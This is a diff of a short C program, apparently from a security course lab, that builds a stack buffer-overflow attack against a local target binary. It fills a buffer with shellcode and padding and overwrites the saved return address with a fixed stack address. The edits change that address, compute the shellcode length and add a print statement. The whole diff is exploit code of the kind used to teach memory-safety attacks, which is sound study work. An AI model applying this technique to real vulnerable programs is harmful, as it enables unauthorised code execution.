@@ -6,8 +6,8 @@
 
 #define TARGET "../targets/target1"
 #define BUFSIZE 125
-#define TARGET_RA_ADDR 0x202dfeb0
-#define SHELL_LENGTH 45
+#define TARGET_RA_ADDR 0x202dfe10
+#define SHELL_LENGTH strlen(shellcode)
 
 int
 main ( int argc, char * argv[] )
@@ -16,20 +16,21 @@ main ( int argc, char * argv[] )
 	char *	env[1];
 	char attack_buffer[BUFSIZE];
 	int *p;
+	printf("%s", shellcode);
 
 	for(int i = 0; i < BUFSIZE;i++)
 		attack_buffer[i] = 0x04;
 	
-	for(int i = 0; i < SHELL_LENGTH;i++)
+	for(int i = 0; i < SHELL_LENGTH; i++)
 		attack_buffer[i] = shellcode[i];
 	
-	for(int i = 45 ; i < 120; i++)
+	for(int i = SHELL_LENGTH ; i < 120; i++)
 		attack_buffer[i] = 0x05;
 
-	int *a = (int*)&attack_buffer[120];
-	*a = TARGET_RA_ADDR;
+	int *ret_address = (int*)&attack_buffer[120];
+	*ret_address = TARGET_RA_ADDR;
 
-	attack_buffer[BUFSIZE-1] = '\0';
+	attack_buffer[BUFSIZE - 1] = '\0';
 
 	args[0] = TARGET;
 	args[1] = attack_buffer;
